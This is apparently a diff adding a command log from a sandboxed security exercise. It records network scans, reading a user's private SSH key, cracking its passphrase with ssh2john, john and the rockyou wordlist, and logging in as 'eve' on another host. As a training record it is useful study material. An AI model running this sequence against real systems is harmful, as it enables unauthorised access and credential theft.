@@ -1,0 +1,22 @@
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:49:24.218607+02:00", "cmd_type": "bash-command", "cmd": "nmap 81.2.195.254"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:50:06.776691+02:00", "cmd_type": "bash-command", "cmd": "curl 81.2.195.254"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:50:41.319050+02:00", "cmd_type": "bash-command", "cmd": "ping 10.1.18.22"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:50:45.731895+02:00", "cmd_type": "bash-command", "cmd": "nmap 10.1.18.22"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:51:08.233762+02:00", "cmd_type": "bash-command", "cmd": "nmap 10.1.17.4"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:52:34.827472+02:00", "cmd_type": "bash-command", "cmd": "cd .ssh"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:52:35.184477+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:52:39.201294+02:00", "cmd_type": "bash-command", "cmd": "cat id_rsa"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:52:46.531328+02:00", "cmd_type": "bash-command", "cmd": "john id_rsa"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:11.402416+02:00", "cmd_type": "bash-command", "cmd": "ssh2john"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:14.302241+02:00", "cmd_type": "bash-command", "cmd": "locate ssh2john"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:18.295646+02:00", "cmd_type": "bash-command", "cmd": "cd"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:20.644773+02:00", "cmd_type": "bash-command", "cmd": "python ssh2john.py"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:24.038336+02:00", "cmd_type": "bash-command", "cmd": "python ssh2john.py .ssh/id_rsa"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:36.194264+02:00", "cmd_type": "bash-command", "cmd": "python ssh2john.py .ssh/id_rsa > eve"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:40.020831+02:00", "cmd_type": "bash-command", "cmd": "john eve"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:53:53.894009+02:00", "cmd_type": "bash-command", "cmd": "locate rockyou"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:54:08.749508+02:00", "cmd_type": "bash-command", "cmd": "john eve --wordlist=/usr/share/wordlists/rockyou.txt"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:54:47.713958+02:00", "cmd_type": "bash-command", "cmd": "ls"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:55:12.685095+02:00", "cmd_type": "bash-command", "cmd": "ssh eve@10.1.17.4"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:55:24.362958+02:00", "cmd_type": "bash-command", "cmd": "chmod 600 .ssh/id_rsa"}
+{"sandbox_id": "92", "timestamp_str": "2020-07-15T11:55:25.837319+02:00", "cmd_type": "bash-command", "cmd": "ssh eve@10.1.17.4"}
